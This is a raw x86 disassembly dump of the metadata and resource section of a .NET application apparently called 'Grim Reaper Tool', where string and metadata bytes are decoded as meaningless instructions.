  404241:	add    BYTE PTR [eax+eax*1+0x6c],ch
  404245:	add    BYTE PTR [eax],ah
  404247:	add    BYTE PTR [edx+0x0],dl
  40424a:	jne    0x40424c
  40424c:	outs   dx,BYTE PTR ds:[esi]
  40424d:	add    BYTE PTR [eax+eax*1+0x69],dh
  404251:	add    BYTE PTR [ebp+0x0],ch
  404254:	add    BYTE PTR gs:[ebx+0x0],dh
  404258:	add    BYTE PTR [ecx],ah
  40425a:	arpl   WORD PTR [eax],ax
  40425c:	push   0x63006500
  404261:	add    BYTE PTR [ebx+0x0],ch
  404264:	push   esi
  404265:	add    BYTE PTR [ebp+0x0],ah
  404268:	jb     0x40426a
  40426a:	imul   eax,DWORD PTR [eax],0x790066
  404270:	inc    esi
  404271:	add    BYTE PTR [ecx+0x0],ch
  404274:	ins    BYTE PTR es:[edi],dx
  404275:	add    BYTE PTR [ebp+0x0],ah
  404278:	jae    0x40427a
  40427a:	add    BYTE PTR [ebx],ah
  40427c:	push   esi
  40427d:	add    BYTE PTR [ebp+0x0],ah
  404280:	jb     0x404282
  404282:	imul   eax,DWORD PTR [eax],0x790066
  404288:	and    BYTE PTR [eax],al
  40428a:	inc    edi
  40428b:	add    BYTE PTR [ecx+0x0],ah
  40428e:	ins    DWORD PTR es:[edi],dx
  40428f:	add    BYTE PTR [ebp+0x0],ah
  404292:	and    BYTE PTR [eax],al
  404294:	inc    esi
  404295:	add    BYTE PTR [ecx+0x0],ch
  404298:	ins    BYTE PTR es:[edi],dx
  404299:	add    BYTE PTR [ebp+0x0],ah
  40429c:	jae    0x40429e
  40429e:	add    BYTE PTR ds:0x680063,ah
  4042a4:	add    BYTE PTR gs:[ebx+0x0],ah
  4042a8:	imul   eax,DWORD PTR [eax],0x52
  4042ab:	add    BYTE PTR [ebp+0x0],ah
  4042ae:	jae    0x4042b0
  4042b0:	add    BYTE PTR gs:[eax+eax*1+0x53],dh
  4042b5:	add    BYTE PTR [ebp+0x0],ah
  4042b8:	je     0x4042ba
  4042ba:	je     0x4042bc
  4042bc:	imul   eax,DWORD PTR [eax],0x67006e
  4042c2:	jae    0x4042c4
  4042c4:	add    BYTE PTR ds:0x650052,bl
  4042ca:	jae    0x4042cc
  4042cc:	add    BYTE PTR gs:[eax+eax*1+0x20],dh
  4042d1:	add    BYTE PTR [ebx+0x0],dl
  4042d4:	add    BYTE PTR gs:[eax+eax*1+0x74],dh
  4042d9:	add    BYTE PTR [ecx+0x0],ch
  4042dc:	outs   dx,BYTE PTR ds:[esi]
  4042dd:	add    BYTE PTR [edi+0x0],ah
  4042e0:	jae    0x4042e2
  4042e2:	add    BYTE PTR [ecx],bl
  4042e4:	bound  eax,QWORD PTR [eax]
  4042e6:	jne    0x4042e8
  4042e8:	je     0x4042ea
  4042ea:	je     0x4042ec
  4042ec:	outs   dx,DWORD PTR ds:[esi]
  4042ed:	add    BYTE PTR [esi+0x0],ch
  4042f0:	push   edx
  4042f1:	add    BYTE PTR [ebp+0x0],ah
  4042f4:	jo     0x4042f6
  4042f6:	popa   
  4042f7:	add    BYTE PTR [ecx+0x0],ch
  4042fa:	jb     0x4042fc
  4042fc:	add    BYTE PTR ds:0x650052,cl
  404302:	jo     0x404304
  404304:	popa   
  404305:	add    BYTE PTR [ecx+0x0],ch
  404308:	jb     0x40430a
  40430a:	add    BYTE PTR [edi],dl
  40430c:	bound  eax,QWORD PTR [eax]
  40430e:	jne    0x404310
  404310:	je     0x404312
  404312:	je     0x404314
  404314:	outs   dx,DWORD PTR ds:[esi]
  404315:	add    BYTE PTR [esi+0x0],ch
  404318:	inc    ebx
  404319:	add    BYTE PTR [eax+eax*1+0x6f],ch
  40431d:	add    BYTE PTR [ebx+0x0],dh
  404320:	add    BYTE PTR gs:[eax],al
  404323:	or     eax,DWORD PTR [ebx+0x0]
  404326:	ins    BYTE PTR es:[edi],dx
  404327:	add    BYTE PTR [edi+0x0],ch
  40432a:	jae    0x40432c
  40432c:	add    BYTE PTR gs:[eax],al
  40432f:	adc    eax,0x740024
  404334:	push   0x73006900
  404339:	add    BYTE PTR [esi],ch
  40433b:	add    BYTE PTR [ecx+0x0],cl
  40433e:	arpl   WORD PTR [eax],ax
  404340:	outs   dx,DWORD PTR ds:[esi]
  404341:	add    BYTE PTR [esi+0x0],ch
  404344:	add    BYTE PTR [ecx],dl
  404346:	inc    esi
  404347:	add    BYTE PTR [edi+0x0],ch
  40434a:	jb     0x40434c
  40434c:	ins    DWORD PTR es:[edi],dx
  40434d:	add    BYTE PTR [ebp+0x0],cl
  404350:	popa   
  404351:	add    BYTE PTR [ecx+0x0],ch
  404354:	outs   dx,BYTE PTR ds:[esi]
  404355:	add    BYTE PTR [eax],al
  404357:	add    DWORD PTR [eax],eax
  404359:	add    edi,DWORD PTR [ebx+0x0]
  40435c:	add    BYTE PTR [ebx],al
  40435e:	jge    0x404360
  404360:	add    BYTE PTR [edi],dh
  404362:	push   edx
  404363:	add    BYTE PTR [ebp+0x0],ah
  404366:	jo     0x404368
  404368:	popa   
  404369:	add    BYTE PTR [ecx+0x0],ch
  40436c:	jb     0x40436e
  40436e:	add    BYTE PTR cs:[eax+0x0],dl
  404372:	jb     0x404374
  404374:	outs   dx,DWORD PTR ds:[esi]
  404375:	add    BYTE PTR [eax+0x0],dh
  404378:	add    BYTE PTR gs:[edx+0x0],dh
  40437c:	je     0x40437e
  40437e:	imul   eax,DWORD PTR [eax],0x730065
  404384:	add    BYTE PTR cs:[edx+0x0],dl
  404388:	add    BYTE PTR gs:[ebx+0x0],dh
  40438c:	outs   dx,DWORD PTR ds:[esi]
  40438d:	add    BYTE PTR [ebp+0x0],dh
  404390:	jb     0x404392
  404392:	arpl   WORD PTR [eax],ax
  404394:	add    BYTE PTR gs:[ebx+0x0],dh
  404398:	add    BYTE PTR [eax],al
  40439a:	add    BYTE PTR [eax],al
  40439c:	xchg   ecx,eax
  40439d:	cmp    edx,DWORD PTR [edi-0x6b]
  4043a0:	mov    ebp,DWORD PTR [ecx+0x7]
  4043a3:	dec    ebx
  4043a4:	xchg   esi,eax
  4043a5:	dec    ecx
  4043a6:	jmp    0x40439f
  4043a8:	xchg   edx,eax
  4043a9:	mov    dh,ch
  4043ab:	xchg   ebp,eax
  4043ac:	add    BYTE PTR [eax+eiz*1],al
  4043af:	add    DWORD PTR [ecx],eax
  4043b1:	or     BYTE PTR [ebx],al
  4043b3:	and    BYTE PTR [eax],al
  4043b5:	add    DWORD PTR ds:0x11010120,eax
  4043bb:	adc    DWORD PTR [eax+eiz*1],eax
  4043be:	add    DWORD PTR [ecx],eax
  4043c0:	push   cs
  4043c1:	add    al,0x20
  4043c3:	add    DWORD PTR [ecx],eax
  4043c5:	add    al,BYTE PTR ds:0xe010220
  4043cb:	push   cs
  4043cc:	push   es
  4043cd:	and    BYTE PTR [ecx],al
  4043cf:	add    DWORD PTR [ecx],edx
  4043d1:	or     BYTE PTR [ebp+0x1000003],0x3
  4043d8:	pop    es
  4043d9:	add    DWORD PTR [edx],eax
  4043db:	add    esp,DWORD PTR [eax]
  4043dd:	add    BYTE PTR [edx],al
  4043df:	add    al,0x0
  4043e1:	add    DWORD PTR [edx],eax
  4043e3:	push   cs
  4043e4:	or     al,BYTE PTR [edi]
  4043e6:	push   es
  4043e7:	add    bl,BYTE PTR ds:0x120e0e0e
  4043ed:	pop    ebp
  4043ee:	push   cs
  4043ef:	push   es
  4043f0:	add    BYTE PTR [ecx],al
  4043f2:	push   cs
  4043f3:	adc    DWORD PTR [eax+0x20005ad],eax
  4043f9:	push   cs
  4043fa:	push   cs
  4043fb:	push   cs
  4043fc:	push   es
  4043fd:	add    BYTE PTR [ecx],al
  4043ff:	adc    al,BYTE PTR [eax+0x60eb9]
  404405:	add    al,BYTE PTR [ecx]
  404407:	push   cs
  404408:	sbb    eax,0x4000d0e
  40440d:	adc    DWORD PTR [eax+0x110e0ec1],eax
  404413:	add    ch,0x11
  404416:	or     cl,0x6
  404419:	add    BYTE PTR [ecx],al
  40441b:	adc    al,BYTE PTR [eax+0x6030ecd]
  404421:	adc    bl,BYTE PTR [ebp+0x5]
  404424:	and    BYTE PTR [ecx],al
  404426:	adc    bl,BYTE PTR [ebp+0xe]
  404429:	add    al,0x20
  40442b:	add    DWORD PTR [esi+ecx*1],ebx
  40442e:	add    esp,DWORD PTR [eax]
  404430:	add    BYTE PTR [esi],cl
  404432:	add    al,0x7
  404434:	add    DWORD PTR [edx],edx
  404436:	or     BYTE PTR gs:[eax],al
  404439:	add    DWORD PTR [edx],edx
  40443b:	sbb    cl,0x11
  40443e:	sbb    ch,0x6
  404441:	and    BYTE PTR [ecx],al
  404443:	add    DWORD PTR [edx],edx
  404445:	sbb    cl,0x5
  404448:	and    BYTE PTR [eax],al
  40444a:	adc    al,BYTE PTR [eax+0x12006e1]
  404450:	add    DWORD PTR [edx],edx
  404452:	sbb    BYTE PTR [ebp+0x1022005],0x8
  404459:	or     BYTE PTR [esi],al
  40445b:	and    BYTE PTR [ecx],al
  40445d:	add    DWORD PTR [ecx],edx
  40445f:	and    ch,0x6
  404462:	and    BYTE PTR [ecx],al
  404464:	add    DWORD PTR [ecx],edx
  404466:	sub    cl,0x5
  404469:	and    BYTE PTR [edx],al
  40446b:	add    DWORD PTR [eax+ebx*1],ebx
  40446e:	push   es
  40446f:	and    BYTE PTR [ecx],al
  404471:	add    DWORD PTR [edx],edx
  404473:	xor    cl,0x6
  404476:	and    BYTE PTR [ecx],al
  404478:	add    DWORD PTR [ecx],edx
  40447a:	xor    ch,0x6
  40447d:	and    BYTE PTR [ecx],al
  40447f:	add    DWORD PTR [ecx],edx
  404481:	cmp    cl,0x6
  404484:	and    BYTE PTR [ecx],al
  404486:	add    DWORD PTR [ecx],edx
  404488:	add    cl,0x6
  40448b:	and    BYTE PTR [ecx],al
  40448d:	add    DWORD PTR [edx],edx
  40448f:	cmp    ch,0x5
  404492:	and    BYTE PTR [edx],al
  404494:	add    DWORD PTR [esp+ecx*1],ecx
  404497:	push   es
  404498:	and    BYTE PTR [ecx],al
  40449a:	add    DWORD PTR [ecx],edx
  40449c:	add    DWORD PTR [ecx],0x1012006
  4044a2:	adc    DWORD PTR [ecx+0x1200609],eax
  4044a8:	add    DWORD PTR [ecx],edx
  4044aa:	or     DWORD PTR ds:0x1012006,0x6118112
  4044b4:	and    BYTE PTR [ecx],al
  4044b6:	add    DWORD PTR [ecx],edx
  4044b8:	adc    DWORD PTR ds:0x1010004,0x1000502
  4044c2:	add    DWORD PTR [edx],edx
  4044c4:	inc    ecx
  4044c5:	or     DWORD PTR [edi],eax
  4044c7:	add    al,0x12
  4044c9:	sbb    al,0xe
  4044cb:	adc    bl,BYTE PTR [edx+edx*1]
  4044ce:	sbb    al,0x6
  4044d0:	adc    eax,0x12017112
  4044d5:	sbb    al,0x5
  4044d7:	and    BYTE PTR [ecx],al
  4044d9:	add    DWORD PTR [ebx],edx
  4044db:	add    BYTE PTR ds:0xe020200,al
  4044e1:	push   cs
  4044e2:	push   es
  4044e3:	pop    es
  4044e4:	add    al,0xe
  4044e6:	add    al,BYTE PTR [edx]
  4044e8:	add    eax,DWORD PTR [ebx]
  4044ea:	and    BYTE PTR [eax],al
  4044ec:	or     BYTE PTR ds:0x1d0e0120,al
  4044f2:	add    edx,DWORD PTR [edx]
  4044f4:	pop    es
  4044f5:	pop    es
  4044f6:	sbb    eax,0x81c120e
  4044fb:	adc    bl,BYTE PTR [edx*1+0x12017511]
  404502:	sbb    al,0x12
  404504:	sbb    al,0x2
  404506:	push   es
  404507:	and    BYTE PTR [ecx],al
  404509:	sbb    eax,0x8031d0e
  40450e:	and    BYTE PTR [eax],al
  404510:	adc    eax,0x13017511
  404515:	add    BYTE PTR [esi],al
  404517:	adc    eax,0x12017511
  40451c:	sbb    al,0x4
  40451e:	and    BYTE PTR [eax],al
  404520:	adc    eax,DWORD PTR [eax]
  404522:	add    eax,0x81120020
  404527:	and    eax,0x1022007
  40452c:	push   cs
  40452d:	adc    al,BYTE PTR [ecx+0x1000825]
  404533:	adc    al,BYTE PTR [ecx+0x29811229]
  404539:	or     BYTE PTR [edi+0x19565c7a],dh
  40453f:	xor    al,0xe0
  404541:	mov    DWORD PTR [eax],ecx
  404543:	mov    al,0x3f
  404545:	pop    edi
  404546:	jg     0x404559
  404548:	aad    0xa
  40454a:	cmp    al,BYTE PTR [ebx]
  40454c:	push   es
  40454d:	adc    al,BYTE PTR [ebp+0x3]
  404550:	push   es
  404551:	adc    cl,BYTE PTR [ecx+0x3]
  404554:	push   es
  404555:	adc    cl,BYTE PTR [ebp+0x3]
  404558:	push   es
  404559:	adc    dl,BYTE PTR [ecx+0x3]
  40455c:	push   es
  40455d:	adc    ch,BYTE PTR [ebp+0x3]
  404560:	push   es
  404561:	adc    bl,BYTE PTR [esp+eax*1]
  404564:	push   es
  404565:	adc    al,BYTE PTR [eax+0x12060485]
  40456b:	or     BYTE PTR [ecx+0x18120603],0x2
  404572:	push   es
  404573:	push   cs
  404574:	pop    es
  404575:	push   es
  404576:	adc    eax,0x12017112
  40457b:	sbb    al,0x6
  40457d:	and    BYTE PTR [edx],al
  40457f:	add    DWORD PTR [edx+edx*1],ebx
  404582:	pop    ecx
  404583:	add    al,0x20
  404585:	add    DWORD PTR [edx],eax
  404587:	add    eax,DWORD PTR [esi]
  404589:	and    BYTE PTR [edx],al
  40458b:	add    cl,BYTE PTR [esi]
  40458d:	adc    BYTE PTR [esi],cl
  40458f:	add    eax,0x80120000
  404594:	test   DWORD PTR ds:0x80120000,eax
  40459a:	mov    DWORD PTR [esi],eax
  40459c:	add    BYTE PTR [ecx],al
  40459e:	add    DWORD PTR [edx],edx
  4045a0:	or     BYTE PTR [ecx+0x12000004],0x18
  4045a7:	add    eax,0x80120008
  4045ac:	test   DWORD PTR ds:0x80120008,eax
  4045b2:	mov    DWORD PTR [eax+ecx*1],eax
  4045b5:	add    BYTE PTR [edx],dl
  4045b7:	sbb    BYTE PTR [eax],cl
  4045b9:	add    DWORD PTR [eax],eax
  4045bb:	or     BYTE PTR [eax],al
  4045bd:	add    BYTE PTR [eax],al
  4045bf:	add    BYTE PTR [eax],al
  4045c1:	push   ds
  4045c2:	add    DWORD PTR [eax],eax
  4045c4:	add    DWORD PTR [eax],eax
  4045c6:	push   esp
  4045c7:	add    dl,BYTE PTR [esi]
  4045c9:	push   edi
  4045ca:	jb     0x40462d
  4045cc:	jo     0x40461c
  4045ce:	outs   dx,DWORD PTR ds:[esi]
  4045cf:	outs   dx,BYTE PTR ds:[esi]
  4045d0:	inc    ebp
  4045d1:	js     0x404636
  4045d3:	gs jo  0x40464a
  4045d6:	imul   ebp,DWORD PTR [edi+0x6e],0x6f726854
  4045dd:	ja     0x404652
  4045df:	add    DWORD PTR [eax],ecx
  4045e1:	add    DWORD PTR [eax],eax
  4045e3:	add    al,BYTE PTR [eax]
  4045e5:	add    BYTE PTR [eax],al
  4045e7:	add    BYTE PTR [eax],al
  4045e9:	sbb    al,BYTE PTR [ecx]
  4045eb:	add    BYTE PTR ds:0x6d697247,dl
  4045f1:	and    BYTE PTR [ecx+eiz*2+0x77],al
  4045f5:	outs   dx,BYTE PTR ds:[esi]
  4045f6:	and    BYTE PTR [edx+0x65],dl
  4045f9:	jo     0x40465c
  4045fb:	imul   esi,DWORD PTR [edx+0x20],0x6c6f6f54
  404602:	add    BYTE PTR [eax],al
  404604:	add    eax,0x1
  404609:	add    BYTE PTR [eax],bl
  40460b:	add    DWORD PTR [eax],eax
  40460d:	adc    eax,DWORD PTR [ebx+0x72]
  404610:	popa   
  404611:	je     0x404678
  404613:	and    BYTE PTR [ebp+0x6e],al
  404616:	je     0x40467d
  404618:	jb     0x40468e
  40461a:	popa   
  40461b:	imul   ebp,DWORD PTR [esi+0x6d],0x746e65
  404622:	add    BYTE PTR [ebx],cl
  404624:	add    DWORD PTR [eax],eax
  404626:	push   es
  404627:	push   edx
  404628:	gs jo  0x40468c
  40462b:	imul   esi,DWORD PTR [edx+0x0],0x11500
  404632:	adc    BYTE PTR [ebx+0x6f],al
  404635:	jo     0x4046b0
  404637:	jb     0x4046a2
  404639:	addr16 push 0xa9c22074
  40463f:	xor    dh,BYTE PTR [eax]
  404641:	xor    DWORD PTR [ebx],esi
  404643:	add    BYTE PTR [eax],al
  404645:	sub    DWORD PTR [ecx],eax
  404647:	add    BYTE PTR [edi+esi*1],ah
  40464a:	xor    ah,BYTE PTR [edx+0x36]
  40464d:	xor    eax,0x2d366633
  404652:	ss popaw 
  404655:	xor    eax,0x6231342d
  40465a:	cmp    DWORD PTR ds:0x65333538,ebp
  404660:	sub    eax,0x38396439
  404665:	xor    esi,DWORD PTR [ebx]
  404667:	arpl   WORD PTR [ebx+0x39],sp
  40466a:	xor    esi,DWORD PTR [ebx+esi*1]
  40466d:	add    BYTE PTR [eax],al
  40466f:	or     al,0x1
  404671:	add    BYTE PTR [edi],al
  404673:	xor    DWORD PTR [esi],ebp
  404675:	xor    BYTE PTR [esi],ch
  404677:	xor    BYTE PTR [esi],ch
  404679:	xor    BYTE PTR [eax],al
  40467b:	add    BYTE PTR [ebp+0x1],ah
  40467e:	add    BYTE PTR [ecx],ch
  404680:	cs dec esi
  404682:	inc    ebp
  404683:	push   esp
  404684:	inc    esi
  404685:	jb     0x4046e8
  404687:	ins    DWORD PTR es:[edi],dx
  404688:	gs ja  0x4046fa
  40468b:	jb     0x4046f8
  40468d:	sub    al,0x56
  40468f:	gs jb  0x404705
  404692:	imul   ebp,DWORD PTR [edi+0x6e],0x2e34763d
  404699:	xor    BYTE PTR [eax+edx*2],ch
  40469c:	jb     0x40470d
  40469e:	imul   bp,WORD PTR [ebp+eiz*2+0x3d],0x6c43
  4046a5:	imul   esp,DWORD PTR [ebp+0x6e],0x54000174
  4046ac:	push   cs
  4046ad:	adc    al,0x46
  4046af:	jb     0x404712
  4046b1:	ins    DWORD PTR es:[edi],dx
  4046b2:	gs ja  0x404724
  4046b5:	jb     0x404722
  4046b7:	inc    esp
  4046b8:	imul   esi,DWORD PTR [ebx+0x70],0x4e79616c
  4046bf:	popa   
  4046c0:	ins    DWORD PTR es:[edi],dx
  4046c1:	gs pop ds
  4046c3:	cs dec esi
  4046c5:	inc    ebp
  4046c6:	push   esp
  4046c7:	and    BYTE PTR [esi+0x72],al
  4046ca:	popa   
  4046cb:	ins    DWORD PTR es:[edi],dx
  4046cc:	gs ja  0x40473e
  4046cf:	jb     0x40473c
  4046d1:	and    BYTE PTR [eax+eiz*1],dh
  4046d4:	inc    ebx
  4046d5:	ins    BYTE PTR es:[edi],dx
  4046d6:	imul   esp,DWORD PTR [ebp+0x6e],0x72502074
  4046dd:	outs   dx,DWORD PTR ds:[esi]
  4046de:	imul   bp,WORD PTR [ebp+eiz*2+0x4],0x1
  4046e5:	add    BYTE PTR [eax],al
  4046e7:	inc    eax
  4046e8:	add    DWORD PTR [eax],eax
  4046ea:	xor    edx,DWORD PTR [ebx+0x79]
  4046ed:	jae    0x404763
  4046ef:	gs ins DWORD PTR es:[edi],dx
  4046f1:	cs push edx
  4046f3:	gs jae 0x404765
  4046f6:	jne    0x40476a
  4046f8:	arpl   WORD PTR [ebp+0x73],sp
  4046fb:	cs push esp
  4046fd:	outs   dx,DWORD PTR ds:[esi]
  4046fe:	outs   dx,DWORD PTR ds:[esi]
  4046ff:	ins    BYTE PTR es:[edi],dx
  404700:	jae    0x404730
  404702:	push   ebx
  404703:	je     0x404777
  404705:	outs   dx,DWORD PTR ds:[esi]
  404706:	outs   dx,BYTE PTR ds:[esi]
  404707:	ins    BYTE PTR es:[di],dx
  404709:	jns    0x40475f
  40470b:	jns    0x40477d
  40470d:	gs fs push edx
  404710:	gs jae 0x404782
  404713:	jne    0x404787
  404715:	arpl   WORD PTR [ebp+0x42],sp
  404718:	jne    0x404783
  40471a:	ins    BYTE PTR es:[edi],dx
  40471b:	fs gs jb 0x404726
  40471f:	xor    al,0x2e
  404721:	xor    BYTE PTR [esi],ch
  404723:	xor    BYTE PTR [esi],ch
  404725:	xor    BYTE PTR [eax],al
  404727:	add    BYTE PTR [ecx+0x1],bl
  40472a:	add    BYTE PTR [ebx+0x4d],cl
  40472d:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  404734:	je     0x404764
  404736:	push   esi
  404737:	imul   esi,DWORD PTR [ebx+0x75],0x74536c61
  40473e:	jne    0x4047a4
  404740:	imul   ebp,DWORD PTR [edi+0x2e],0x74696445
  404747:	outs   dx,DWORD PTR ds:[esi]
  404748:	jb     0x4047bd
  40474a:	cs push ebx
  40474c:	gs je  0x4047c3
  40474f:	imul   ebp,DWORD PTR [esi+0x67],0x73654473
  404756:	imul   esp,DWORD PTR [edi+0x6e],0x532e7265
  40475d:	gs je  0x4047d4
  404760:	imul   ebp,DWORD PTR [esi+0x67],0x6e695373
  404767:	ins    BYTE PTR es:[di],dx
  404769:	gs inc esi
  40476b:	imul   ebp,DWORD PTR [ebp+eiz*2+0x47],0x72656e65
  404773:	popa   
  404774:	je     0x4047e5
  404776:	jb     0x404780
  404778:	xor    DWORD PTR [ecx],esi
  40477a:	xor    BYTE PTR cs:[esi],ch
  40477d:	xor    BYTE PTR [esi],ch
  40477f:	xor    BYTE PTR [eax],al
  404781:	add    BYTE PTR [eax],al
  404783:	add    BYTE PTR [eax-0x31fffb40],ah
  404789:	retf   0xbeef
  40478c:	add    DWORD PTR [eax],eax
  40478e:	add    BYTE PTR [eax],al
  404790:	xchg   ecx,eax
  404791:	add    BYTE PTR [eax],al
  404793:	add    BYTE PTR [ebx+edx*2+0x79],ch
  404797:	jae    0x40480d
  404799:	gs ins DWORD PTR es:[edi],dx
  40479b:	cs push edx
  40479d:	gs jae 0x40480f
  4047a0:	jne    0x404814
  4047a2:	arpl   WORD PTR [ebp+0x73],sp
  4047a5:	cs push edx
  4047a7:	gs jae 0x404819
  4047aa:	jne    0x40481e
  4047ac:	arpl   WORD PTR [ebp+0x52],sp
  4047af:	gs popa 
  4047b1:	fs gs jb 0x4047e1
  4047b5:	and    BYTE PTR [ebp+0x73],ch
  4047b8:	arpl   WORD PTR [edi+0x72],bp
  4047bb:	ins    BYTE PTR es:[edi],dx
  4047bc:	imul   esp,DWORD PTR [edx+0x2c],0x72655620
  4047c3:	jae    0x40482e
  4047c5:	outs   dx,DWORD PTR ds:[esi]
  4047c6:	outs   dx,BYTE PTR ds:[esi]
  4047c7:	cmp    eax,0x2e302e34
  4047cc:	xor    BYTE PTR [esi],ch
  4047ce:	xor    BYTE PTR [eax+eiz*1],ch
  4047d1:	inc    ebx
  4047d2:	jne    0x404840
  4047d4:	je     0x40484b
  4047d6:	jb     0x40483d
  4047d8:	cmp    eax,0x7475656e
  4047dd:	jb     0x404840
  4047df:	ins    BYTE PTR es:[edi],dx
  4047e0:	sub    al,0x20
  4047e2:	push   eax
  4047e3:	jne    0x404847
  4047e5:	ins    BYTE PTR es:[edi],dx
  4047e6:	imul   esp,DWORD PTR [ebx+0x4b],0x6f547965
  4047ed:	imul   esp,DWORD PTR [ebp+0x6e],0x3d
  4047f1:	bound  esi,QWORD PTR [edi]
  4047f3:	aaa    
  4047f4:	popa   
  4047f5:	xor    eax,0x31363563
  4047fa:	cmp    DWORD PTR [ebx],esi
  4047fc:	xor    al,0x65
  4047fe:	xor    BYTE PTR [eax],bh
  404800:	cmp    DWORD PTR [ebx],esp
  404802:	push   ebx
  404803:	jns    0x404878
  404805:	je     0x40486c
  404807:	ins    DWORD PTR es:[edi],dx
  404808:	cs push edx
  40480a:	gs jae 0x40487c
  40480d:	jne    0x404881
  40480f:	arpl   WORD PTR [ebp+0x73],sp
  404812:	cs push edx
  404814:	jne    0x404884
  404816:	je     0x404881
  404818:	ins    DWORD PTR es:[edi],dx
  404819:	gs push edx
  40481b:	gs jae 0x40488d
  40481e:	jne    0x404892
  404820:	arpl   WORD PTR [ebp+0x53],sp
  404823:	gs je  0x404828
  404826:	add    BYTE PTR [eax],al
  404828:	add    BYTE PTR [ecx],al
  40482a:	add    BYTE PTR [eax],al
  40482c:	add    BYTE PTR [ecx],al
  40482e:	add    BYTE PTR [eax],al
  404830:	add    BYTE PTR [esi+0x53],ah
  404833:	jns    0x4048a8
  404835:	je     0x40489c
  404837:	ins    DWORD PTR es:[edi],dx
  404838:	cs inc esp
  40483a:	jb     0x40489d
  40483c:	ja     0x4048a7
  40483e:	outs   dx,BYTE PTR ds:[esi]
  40483f:	addr16 cs dec ecx
  404842:	arpl   WORD PTR [edi+0x6e],bp
  404845:	sub    al,0x20
  404847:	push   ebx
  404848:	jns    0x4048bd
  40484a:	je     0x4048b1
  40484c:	ins    DWORD PTR es:[edi],dx
  40484d:	cs inc esp
  40484f:	jb     0x4048b2
  404851:	ja     0x4048bc
  404853:	outs   dx,BYTE PTR ds:[esi]
  404854:	addr16 sub al,0x20
  404857:	push   esi
  404858:	gs jb  0x4048ce
  40485b:	imul   ebp,DWORD PTR [edi+0x6e],0x302e343d
  404862:	xor    BYTE PTR cs:[esi],ch
  404865:	xor    BYTE PTR [eax+eiz*1],ch
  404868:	inc    ebx
  404869:	jne    0x4048d7
  40486b:	je     0x4048e2
  40486d:	jb     0x4048d4
  40486f:	cmp    eax,0x7475656e
  404874:	jb     0x4048d7
  404876:	ins    BYTE PTR es:[edi],dx
  404877:	sub    al,0x20
  404879:	push   eax
  40487a:	jne    0x4048de
  40487c:	ins    BYTE PTR es:[edi],dx
  40487d:	imul   esp,DWORD PTR [ebx+0x4b],0x6f547965
  404884:	imul   esp,DWORD PTR [ebp+0x6e],0x3d
  404888:	bound  esi,QWORD PTR [eax]
  40488a:	xor    esp,DWORD PTR [esi+0x35]
  40488d:	data16 aaa 
  40488f:	xor    WORD PTR [ecx],si
  404892:	fs xor eax,0x61336130
  404898:	inc    edx
  404899:	push   0xffffff9b
  40489b:	call   0x135:0x0
  4048a2:	add    BYTE PTR [eax],al
  4048a4:	adc    al,0x24
  4048a6:	add    BYTE PTR [eax+eax*1+0x68],dh
  4048aa:	add    BYTE PTR [ecx+0x0],ch
  4048ad:	jae    0x4048af
  4048af:	add    BYTE PTR cs:[ecx+0x0],cl
  4048b3:	arpl   WORD PTR [eax],ax
  4048b5:	outs   dx,DWORD PTR ds:[esi]
  4048b6:	add    BYTE PTR [esi+0x0],ch
  4048b9:	add    BYTE PTR [eax],al
  4048bb:	add    BYTE PTR [eax],al
  4048bd:	inc    eax
  4048be:	add    BYTE PTR [ecx],al
  4048c0:	add    BYTE PTR [eax],al
  4048c2:	add    bh,bh
  4048c4:	(bad)  
  4048c5:	(bad)  
  4048c6:	inc    DWORD PTR [ecx]
  4048c8:	add    BYTE PTR [eax],al
  4048ca:	add    BYTE PTR [eax],al
  4048cc:	add    BYTE PTR [eax],al
  4048ce:	add    BYTE PTR [edx+eax*1],cl
  4048d1:	add    BYTE PTR [eax],al
  4048d3:	add    BYTE PTR [ecx+0x53],dl
  4048d6:	jns    0x40494b
  4048d8:	je     0x40493f
  4048da:	ins    DWORD PTR es:[edi],dx
  4048db:	cs inc esp
  4048dd:	jb     0x404940
  4048df:	ja     0x40494a
  4048e1:	outs   dx,BYTE PTR ds:[esi]
  4048e2:	addr16 sub al,0x20
  4048e5:	push   esi
  4048e6:	gs jb  0x40495c
  4048e9:	imul   ebp,DWORD PTR [edi+0x6e],0x302e343d
  4048f0:	xor    BYTE PTR cs:[esi],ch
  4048f3:	xor    BYTE PTR [eax+eiz*1],ch
  4048f6:	inc    ebx
  4048f7:	jne    0x404965
  4048f9:	je     0x404970
  4048fb:	jb     0x404962
  4048fd:	cmp    eax,0x7475656e
  404902:	jb     0x404965
  404904:	ins    BYTE PTR es:[edi],dx
  404905:	sub    al,0x20
  404907:	push   eax
  404908:	jne    0x40496c
  40490a:	ins    BYTE PTR es:[edi],dx
  40490b:	imul   esp,DWORD PTR [ebx+0x4b],0x6f547965
  404912:	imul   esp,DWORD PTR [ebp+0x6e],0x3d
  404916:	bound  esi,QWORD PTR [eax]
  404918:	xor    esp,DWORD PTR [esi+0x35]
  40491b:	data16 aaa 
  40491d:	xor    WORD PTR [ecx],si
  404920:	fs xor eax,0x61336130
  404926:	add    eax,0x1
  40492b:	adc    edx,DWORD PTR [ebx+0x79]
  40492e:	jae    0x4049a4
  404930:	gs ins DWORD PTR es:[edi],dx
  404932:	cs inc esp
  404934:	jb     0x404997
  404936:	ja     0x4049a1
  404938:	outs   dx,BYTE PTR ds:[esi]
  404939:	addr16 cs dec ecx
  40493c:	arpl   WORD PTR [edi+0x6e],bp
  40493f:	add    al,BYTE PTR [eax]
  404941:	add    BYTE PTR [eax],al
  404943:	or     BYTE PTR [ecx+0x63],cl
  404946:	outs   dx,DWORD PTR ds:[esi]
  404947:	outs   dx,BYTE PTR ds:[esi]
  404948:	inc    esp
  404949:	popa   
  40494a:	je     0x4049ad
  40494c:	or     BYTE PTR [ecx+0x63],cl
  40494f:	outs   dx,DWORD PTR ds:[esi]
  404950:	outs   dx,BYTE PTR ds:[esi]
  404951:	push   ebx
  404952:	imul   edi,DWORD PTR [edx+0x65],0x13020407
  404959:	push   ebx
  40495a:	jns    0x4049cf
  40495c:	je     0x4049c3
  40495e:	ins    DWORD PTR es:[edi],dx
  40495f:	cs inc esp
  404961:	jb     0x4049c4
  404963:	ja     0x4049ce
  404965:	outs   dx,BYTE PTR ds:[esi]
  404966:	addr16 cs push ebx
  404969:	imul   edi,DWORD PTR [edx+0x65],0x2
  404970:	add    al,BYTE PTR [eax]
  404972:	add    BYTE PTR [eax],al
  404974:	or     DWORD PTR [ebx],eax
  404976:	add    BYTE PTR [eax],al
  404978:	add    BYTE PTR ds:0xfffffffc,al
  40497e:	adc    edx,DWORD PTR [ebx+0x79]
